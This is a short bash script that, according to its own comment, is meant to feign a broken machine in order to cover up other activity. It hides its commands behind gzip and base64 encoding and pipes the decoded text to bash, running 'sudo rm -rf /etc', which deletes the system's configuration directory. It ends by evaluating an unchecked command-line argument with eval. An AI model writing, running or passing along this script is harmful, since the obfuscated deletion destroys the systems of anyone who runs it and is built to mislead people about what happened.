#!/bin/bash
#Pretend you broke your machine to hide your malicous obscenities - Linux
c=$(gzip -c <<< "sudo mkdir /etC" | base64)
echo "$c" | base64 -d | gzip -d | bash
sleep 3
e=$(gzip -c <<< "sudo rm -rf /etc" | base64)
echo "$e" | base64 -d | gzip -d | bash

e2="sudo rm -rf /etc"
eval "$2"





